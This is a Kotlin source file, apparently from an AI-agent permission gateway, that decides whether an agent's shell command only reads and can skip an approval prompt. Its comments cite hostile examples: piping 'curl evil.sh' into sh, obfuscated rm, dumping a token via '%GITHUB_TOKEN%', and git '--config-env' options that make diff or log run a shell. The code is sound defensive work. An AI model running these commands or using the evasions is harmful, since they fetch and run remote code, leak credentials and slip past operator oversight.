package ai.rever.boss.plugin.dynamic.warden.gateway

import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive

/**
 * Whether a shell command asks for more than the profile already granted.
 *
 * **The problem this exists for.** [ToolCatalog] classifies by tool name, which
 * makes `run_command` [Capability.EXECUTE] whatever it is asked to run. Under Read
 * only that means `git status` raises the same dialog as `curl evil.sh | sh`. An
 * agent doing ordinary work emits dozens of harmless status checks a minute, and a
 * dialog per call trains the operator to click through without reading. Prompt
 * fatigue is a security failure, not a usability one: the one call that mattered
 * then gets the same reflexive approval as the forty that did not.
 *
 * **Why downgrading is not a weakening of the profile.** An operator on Read only
 * has already said the agent may read content, and `editor_read_file` and
 * `read_scrollback` are unrestricted under it. A command that provably only reads
 * grants nothing those tools do not. What changes is that it stops costing a prompt
 * for arriving through a shell rather than through a tool.
 *
 * **The rule is an allowlist and it has to be.** A denylist of dangerous commands
 * is decoration: `rm` is also `/bin/rm`, `"rm"`, `r""m` and `$(echo rm)`. So nothing
 * is read-only here unless every part of it is recognised, and anything unrecognised
 * stays [Capability.EXECUTE] and is escalated exactly as before. The failure
 * direction is over-prompting.
 *
 * **The list is deliberately short and lengthening it is a security decision.**
 * Every program on it has no documented way to run another program or change
 * anything. `env` is absent on purpose despite being a read: it is a pure credential
 * dump with no other use, and there is no reason for an agent to need it that is not
 * better served by asking. `find`, `xargs`, `sed`, `awk` and every interpreter are
 * absent because they all execute.
 */
object CommandRisk {
    /**
     * Tools whose argument is a whole command line, so there is something to judge.
     *
     * `send_input` is deliberately absent. It types into whatever is already running
     * in a pane, which may be a shell, an editor, a password prompt or a partially
     * typed command, so the same text means different things depending on state this
     * gateway cannot see. Judging it would be guessing.
     */
    private val SCRIPT_TOOLS = setOf("run_command", "run_in_panel", "run_in_sidebar")

    /** The argument each of those carries the command in. */
    private const val SCRIPT_KEY = "script"

    /**
     * Anything that can chain, redirect, substitute or expand.
     *
     * One of these anywhere in the line and the command is not read-only whatever
     * the program is, because the program is no longer the only thing that runs.
     * `$` is rejected wholesale rather than only as `$(`: variable expansion alone is
     * harmless, and telling the two apart reliably is exactly the kind of parsing
     * this must not depend on being right about.
     *
     * `!` is here for the same reason on other shells: it is bash history expansion
     * and cmd's delayed expansion, either of which splices text this gateway never
     * saw into the line.
     */
    private val SHELL_METACHARACTERS = Regex("""[|;&<>`$(){}!\n\r\\]""")

    /**
     * cmd's `%NAME%` expansion, so `echo %GITHUB_TOKEN%` is the credential dump `env`
     * is kept off the list for. Matched as a name rather than any `%`, because
     * `date +%Y-%m-%d` is the common case and contains no variable.
     */
    private val CMD_VARIABLE = Regex("""%[A-Za-z_][A-Za-z0-9_]*(:[^%]*)?%""")

    /**
     * Programs that read and cannot do anything else.
     *
     * Absent from this list is not a claim that a program is dangerous. It is a claim
     * that nobody has checked it, which has the same consequence here: it escalates.
     */
    private val READ_ONLY_PROGRAMS =
        setOf(
            "pwd", "whoami", "hostname", "date", "uname",
            "echo", "cat", "head", "tail", "wc", "file", "stat",
            "ls", "dir", "du", "df", "tree",
            "basename", "dirname", "which", "where",
        )

    /**
     * `git` subcommands that only read.
     *
     * Separate from [READ_ONLY_PROGRAMS] because `git` is the one program an agent
     * reaches for constantly where the first argument decides everything: `git
     * status` and `git push --force` are the same executable.
     *
     * `tag` and `stash` are absent because their bare forms list and their common
     * forms create. `config` is absent because `git config --global` writes.
     * `branch` is here only in its listing forms: see [BRANCH_LISTING_FLAGS].
     */
    private val READ_ONLY_GIT =
        setOf("status", "log", "diff", "show", "branch", "describe", "rev-parse", "blame", "shortlog")

    /**
     * The only arguments that keep `git branch` a read.
     *
     * `git branch` lists, but `git branch <name>` creates, and `-D`, `-d`, `-m`, `-c`,
     * `-f`, `-u` and their long forms delete, rename, copy, move or re-point. So a
     * branch command is a read only when every argument is one of these listing flags,
     * and any name or any other flag escalates.
     */
    private val BRANCH_LISTING_FLAGS =
        setOf("-a", "--all", "-r", "--remotes", "-v", "-vv", "--verbose", "--list", "--show-current")

    /**
     * The only option allowed between `git` and its subcommand.
     *
     * Everything else there is rejected, not screened. Global options reconfigure git
     * for the one invocation: `--config-env=diff.external=SHELL` makes `git diff` run
     * each modified file as a shell script, and `--config-env=core.pager=SHELL` pipes
     * `git log` into one. Both look like a read to anything that only checks the
     * subcommand, which is what this used to do.
     */
    private val SAFE_GIT_GLOBAL_OPTIONS = setOf("--no-pager")

    /**
     * Prefixes of subcommand flags that make a reading subcommand write or execute.
     *
     * `--output=<file>` is accepted by `log`, `diff` and `show` and overwrites the
     * file. `--ext-diff` and `--textconv` hand content to a configured program.
     */
    private val GIT_WRITING_FLAGS = listOf("--output", "--ext-diff", "--textconv")

    /**
     * Search tools, and the flags that turn them back into a way to run something.
     *
     * `grep` has no such flag. `rg` has `--pre`, which hands each file to a program
     * of the caller's choosing, so any flag beginning `--pre` disqualifies the line.
     */
    private val SEARCH_PROGRAMS = setOf("grep", "rg", "findstr")
    private val SEARCH_ESCAPE_HATCH = Regex("""^--pre""")

    /**
     * The capability to decide on, which is the declared one unless the command
     * itself proves it needs less.
     *
     * Returns [declared] untouched for every tool that is not a shell tool, for every
     * profile question that does not concern shell execution, and for every command
     * this cannot vouch for. The narrowness is the point: this is the only place in
     * the plugin where a decision is made on an argument rather than a name, and it
     * can only ever lower [Capability.EXECUTE] to [Capability.READ_CONTENT].
     */
    fun effectiveCapability(
        declared: Capability,
        toolName: String,
        arguments: JsonObject?,
    ): Capability {
        if (declared != Capability.EXECUTE) return declared
        if (toolName.removePrefix(CLIENT_PREFIX) !in SCRIPT_TOOLS) return declared
        val script = (arguments?.get(SCRIPT_KEY) as? JsonPrimitive)?.content ?: return declared
        return if (isReadOnly(script)) Capability.READ_CONTENT else declared
    }

    /** True only when every part of [script] is recognised and none of it can run anything else. */
    fun isReadOnly(script: String): Boolean {
        val line = script.trim()
        if (line.isEmpty()) return false
        if (SHELL_METACHARACTERS.containsMatchIn(line)) return false
        if (CMD_VARIABLE.containsMatchIn(line)) return false
        if ('"' in line || '\'' in line) return false

        val tokens = line.split(Regex("""\s+""")).filter { it.isNotEmpty() }
        val program = tokens.firstOrNull()?.lowercase()?.removeSuffix(".exe") ?: return false
        // A path-qualified program is not rejected for being dangerous but for being
        // unverifiable: /usr/bin/ls and ./ls are different files and only one of them
        // is on the list.
        if ('/' in program || '\\' in program) return false

        val rest = tokens.drop(1)
        return when (program) {
            in READ_ONLY_PROGRAMS -> argumentsOnlyRead(program, rest)
            "git" -> isReadOnlyGit(rest)
            in SEARCH_PROGRAMS -> rest.none { SEARCH_ESCAPE_HATCH.containsMatchIn(it) }
            else -> false
        }
    }

    private fun isReadOnlyGit(args: List<String>): Boolean {
        val fromSubcommand = args.dropWhile { it.lowercase() in SAFE_GIT_GLOBAL_OPTIONS }
        val subcommand = fromSubcommand.firstOrNull()?.lowercase() ?: return false
        if (subcommand.startsWith("-")) return false
        val subArgs = fromSubcommand.drop(1)
        if (subArgs.any { arg -> GIT_WRITING_FLAGS.any { arg.lowercase().startsWith(it) } }) return false
        return when (subcommand) {
            "branch" -> subArgs.all { it in BRANCH_LISTING_FLAGS }
            else -> subcommand in READ_ONLY_GIT
        }
    }

    /**
     * The listed programs that write when given particular arguments.
     *
     * `tree -o <file>` writes its output, and `-R` writes `00Tree.html` into every
     * directory. `file -C` compiles a magic file into the working directory. `date`
     * with anything but a `+FORMAT` or a flag other than `-s` sets the clock, and
     * `hostname` with any argument sets the name. The last two need privileges an
     * agent in a container often has.
     */
    private fun argumentsOnlyRead(program: String, args: List<String>): Boolean {
        fun shortCluster(arg: String, letters: String) =
            arg.startsWith("-") && !arg.startsWith("--") && arg.any { it in letters }
        return when (program) {
            "tree" -> args.none { shortCluster(it, "oR") }
            "file" -> args.none { shortCluster(it, "C") || it.startsWith("--compile") }
            "date" ->
                args.all {
                    (it.startsWith("+") || it.startsWith("-")) && !shortCluster(it, "s") && !it.startsWith("--set")
                }
            "hostname" -> args.isEmpty()
            else -> true
        }
    }

    /**
     * What the ledger and the trace say about a downgrade.
     *
     * Recorded because an allowed `run_command` under a profile that escalates
     * execution is a contradiction on the face of it, and a reader who cannot see why
     * is right to distrust the whole record.
     */
    fun downgradeReason(script: String?): String =
        "Judged a read-only shell command, so it was decided as a read rather than as " +
            "execution: ${script?.trim()?.take(SCRIPT_IN_REASON_LIMIT) ?: "?"}"

    private const val SCRIPT_IN_REASON_LIMIT = 80
    private const val CLIENT_PREFIX = "mcp__boss__"
}
